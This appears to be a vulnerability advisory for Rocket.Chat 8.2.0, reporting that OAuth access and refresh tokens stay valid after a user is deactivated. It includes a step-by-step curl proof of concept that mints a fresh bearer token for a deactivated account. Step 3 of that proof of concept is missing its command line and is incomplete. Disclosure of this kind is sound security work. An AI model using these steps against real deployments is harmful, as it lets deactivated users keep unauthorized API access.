repo.description:
### Summary
  Rocket.Chat 8.2.0 does not revoke OAuth bearer or refresh tokens when a user is deactivated. A deactivated user can continue using an existing OAuth access token, and can also mint a fresh access token from an existing refresh token.

  ### Details
  User deactivation in `apps/meteor/app/lib/server/functions/setUserActiveStatus.ts:122-126` revokes only Meteor login tokens with `Users.unsetLoginTokens(userId)`. It does not delete OAuth access or refresh tokens.

  OAuth bearer authentication in `apps/meteor/app/oauth2-server-config/server/oauth/oauth2-server.ts:34-47` accepts any non-expired token and loads the user by ID, but it does not verify `user.active`.

  Refresh-token handling in `apps/meteor/server/oauth2-server/model.ts:211-247` also does not validate the user's active state before issuing a new access token.

  As a result, OAuth credentials survive account deactivation.

  ### PoC
  1. Create an OAuth application as an admin:
     ```bash
     APP=$(curl -s -X POST http://localhost:3000/api/v1/oauth-apps.create \
       -H "X-Auth-Token: $ADMIN_TOKEN" \
       -H "X-User-Id: $ADMIN_ID" \
       -H 'Content-Type: application/json' \
       -d '{"name":"poc-app","redirectUri":"http://test.com,http://asd.com","active":true}')
     CLIENT_ID=$(jq -r '.application.clientId' <<<"$APP")
     CLIENT_SECRET=$(jq -r '.application.clientSecret' <<<"$APP")

  2. Authorize the app using the victim's existing Rocket.Chat login token and exchange the code for tokens:
     ```bash
     AUTH=$(curl -isk -X POST \
       "http://localhost:3000/oauth/authorize?scope=user&response_type=token,code&response_mode=form_post&state=poc" \
       -H 'Content-Type: application/x-www-form-urlencoded' \
       --data "token=$VICTIM_LOGIN_TOKEN&client_id=$CLIENT_ID&response_type=code&redirect_uri=http://asd.com&allow=yes")
     CODE=$(sed -n 's/^Location: .*code=\([^&]*\).*/\1/p' <<<"$AUTH" | tr -d '\r')

     TOKENS=$(curl -s -X POST http://localhost:3000/oauth/token \
       -H 'Content-Type: application/x-www-form-urlencoded' \
       --data "grant_type=authorization_code&code=$CODE&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&redirect_uri=http://asd.com")
     REFRESH=$(jq -r '.refresh_token' <<<"$TOKENS")

  3. Deactivate the victim account:
     ```bash
       -H "X-User-Id: $ADMIN_ID" \
       -H 'Content-Type: application/json' \
       -d '{"userId":"'"$VICTIM_ID"'","activeStatus":false,"confirmRelinquish":true}'
  4. Use the refresh token to mint a new bearer token and call a protected API:
     ```bash
     NEWTOKENS=$(curl -s -X POST http://localhost:3000/oauth/token \
       -H 'Content-Type: application/x-www-form-urlencoded' \
       --data "grant_type=refresh_token&refresh_token=$REFRESH&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET")
     ACCESS=$(jq -r '.access_token' <<<"$NEWTOKENS")

     curl -s http://localhost:3000/api/v1/me \
       -H "Authorization: Bearer $ACCESS"

  5. The deactivated user still receives a valid API response.

  ### Impact

  This is a token-revocation and authentication flaw in the community OAuth implementation. Deactivated accounts retain API access through previously issued OAuth credentials, including the ability to refresh into new bearer tokens after administrative deactivation.
repo.summary: OAuth access and refresh tokens remain valid after account deactivation
